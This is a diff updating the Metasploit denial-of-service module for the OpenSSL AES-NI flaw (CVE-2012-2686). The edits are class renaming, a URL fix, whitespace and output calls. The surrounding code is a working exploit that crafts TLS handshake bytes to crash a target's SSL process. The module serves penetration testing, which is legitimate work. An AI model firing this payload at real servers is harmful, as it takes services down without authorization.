@@ -1,12 +1,10 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 # auxilary/dos/ssl/openssl_aesni
-require 'msf/core'
-
-class Metasploit4 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
   include Msf::Auxiliary::Dos
 
@@ -29,7 +27,7 @@ class Metasploit4 < Msf::Auxiliary
       'References'	=>
         [
           [ 'CVE', '2012-2686'],
-          [ 'URL', 'https://www.openssl.org/news/secadv_20130205.txt']
+          [ 'URL', 'https://www.openssl.org/news/secadv/20130205.txt' ]
         ],
       'DisclosureDate' => 'Feb 05 2013'))
 
@@ -37,37 +35,37 @@ class Metasploit4 < Msf::Auxiliary
       [
         Opt::RPORT(443),
         OptInt.new('MAX_TRIES', [true,  "Maximum number of tries", 300])
-      ], self.class)
+      ])
   end
 
   def run
     # Client Hello
-    p1 =  "\x16"					# Content Type: Handshake
+    p1 =  "\x16"				# Content Type: Handshake
     p1 << "\x03\x01"				# Version: TLS 1.0
     p1 << "\x00\x7e"				# Length: 126
-    p1 << "\x01"					# Handshake Type: Client Hello
+    p1 << "\x01"				# Handshake Type: Client Hello
     p1 << "\x00\x00\x7a"			# Length: 122
     p1 << "\x03\x02"				# Version: TLS 1.1
     p1 << ("A" * 32)				# Random
-    p1 << "\x00"					# Session ID Length: 0
+    p1 << "\x00"				# Session ID Length: 0
     p1 << "\x00\x08"				# Cypher Suites Length: 6
     p1 << "\xc0\x13"				# - ECDHE-RSA-AES128-SHA
     p1 << "\x00\x39"				# - DHE-RSA-AES256-SHA
     p1 << "\x00\x35"				# - AES256-SHA
     p1 << "\x00\xff"				# - EMPTY_RENEGOTIATION_INFO_SCSV
-    p1 << "\x01"					# Compression Methods Length: 1
-    p1 << "\x00"					# - NULL-Compression
+    p1 << "\x01"				# Compression Methods Length: 1
+    p1 << "\x00"				# - NULL-Compression
     p1 << "\x00\x49"				# Extensions Length: 73
     p1 << "\x00\x0b"				# - Extension: ec_point_formats
     p1 << "\x00\x04"				#   Length: 4
-    p1 << "\x03"					#   EC Points Format Length: 3
-    p1 << "\x00"					#   - uncompressed
-    p1 << "\x01"					#   - ansiX962_compressed_prime
-    p1 << "\x02"					#   - ansiX962_compressed_char2
+    p1 << "\x03"				#   EC Points Format Length: 3
+    p1 << "\x00"				#   - uncompressed
+    p1 << "\x01"				#   - ansiX962_compressed_prime
+    p1 << "\x02"				#   - ansiX962_compressed_char2
     p1 << "\x00\x0a"				# - Extension: elliptic_curves
     p1 << "\x00\x34"				#   Length: 52
     p1 << "\x00\x32"				#   Elliptic Curves Length: 50
-                    #   25 Elliptic curves:
+    # 25 Elliptic curves:
     p1 << "\x00\x0e\x00\x0d\x00\x19\x00\x0b\x00\x0c\x00\x18\x00\x09\x00\x0a"
     p1 << "\x00\x16\x00\x17\x00\x08\x00\x06\x00\x07\x00\x14\x00\x15\x00\x04"
     p1 << "\x00\x05\x00\x12\x00\x13\x00\x01\x00\x02\x00\x03\x00\x0f\x00\x10"
@@ -77,7 +75,7 @@ class Metasploit4 < Msf::Auxiliary
     p1 << "\x00\x00"				#   Length: 0
     p1 << "\x00\x0f"				# - Extension: Heartbeat
     p1 << "\x00\x01"				#   Length: 1
-    p1 << "\x01"					#   Peer allowed to send requests
+    p1 << "\x01"				#   Peer allowed to send requests
 
 
     # Change Cipher Spec Message
@@ -97,12 +95,12 @@ class Metasploit4 < Msf::Auxiliary
     # Client Key Exchange, Change Cipher Spec, Encrypted Handshake
     # AES256-SHA
     p2_aes_sha =  "\x16"			# Content Type: Handshake
-    p2_aes_sha << "\x03\x02"		# Version: TLS 1.1
-    p2_aes_sha << "\x01\x06"		# Length: 262
+    p2_aes_sha << "\x03\x02"			# Version: TLS 1.1
+    p2_aes_sha << "\x01\x06"			# Length: 262
     p2_aes_sha << "\x10"			# Handshake Type: Client Key Exchange
-    p2_aes_sha << "\x00\x01\x02"	# Length: 258
-    p2_aes_sha << "\x01\x00"		# Encrypted PreMaster Length: 256
-    p2_aes_sha << ("\x00" * 256)	# Encrypted PresMaster (irrelevant)
+    p2_aes_sha << "\x00\x01\x02"		# Length: 258
+    p2_aes_sha << "\x01\x00"			# Encrypted PreMaster Length: 256
+    p2_aes_sha << ("\x00" * 256)		# Encrypted PresMaster (irrelevant)
     p2_aes_sha << p2_cssm 			# Change Cipher Spec Message
     p2_aes_sha << p2_ehm			# Encrypted Handshake Message
 
@@ -112,7 +110,7 @@ class Metasploit4 < Msf::Auxiliary
     p2_dhe << "\x03\x02"			# Version: TLS 1.1
     p2_dhe << "\x00\x46"			# Length: 70
     p2_dhe << "\x10"				# Handshake Type: Client Key Exchange
-    p2_dhe << "\x00\x00\x42"		# Length: 66
+    p2_dhe << "\x00\x00\x42"			# Length: 66
     p2_dhe << "\x00\x40"			# DH Pubkey Length: 64
     p2_dhe << ("A" * 64)			# DH Pubkey
     p2_dhe << p2_cssm				# Change Cipher Spec Message
@@ -124,9 +122,9 @@ class Metasploit4 < Msf::Auxiliary
     p2_ecdhe << "\x03\x02"			# Version: TLS 1.1
     p2_ecdhe << "\x00\x46"			# Length: 70
     p2_ecdhe << "\x10"				# Handshake Type: Client Key Exchange
-    p2_ecdhe << "\x00\x00\x42"		# Length: 66
+    p2_ecdhe << "\x00\x00\x42"			# Length: 66
     p2_ecdhe << "\x41"				# EC DH Pubkey Length: 65
-                    # EC DH Pubkey:
+    # EC DH Pubkey:
     p2_ecdhe << "\x04\x2f\x22\xf4\x06\x3f\xa1\xf7\x3d\xb6\x55\xbc\x68\x65\x57\xd8"
     p2_ecdhe << "\x03\xe5\xaa\x36\xeb\x0f\x52\x5a\xaf\xd0\x9f\xf8\xc7\xfe\x09\x69"
     p2_ecdhe << "\x5b\x38\x95\x58\xb6\x0d\x27\x53\xe9\x63\xcb\x96\xb3\x54\x47\xa6"
@@ -168,7 +166,7 @@ class Metasploit4 < Msf::Auxiliary
       begin
         alert = sock.get_once(-1, 2)
       rescue EOFError
-        print_status("DoS successful. process on #{rhost} did not respond.")
+        print_good("DoS successful. process on #{rhost} did not respond.")
         success = true
         break
       end
@@ -178,7 +176,7 @@ class Metasploit4 < Msf::Auxiliary
     end
 
     if success == false
-      print_status("DoS unsuccessful.")
+      print_error("DoS unsuccessful.")
     end
   end
 
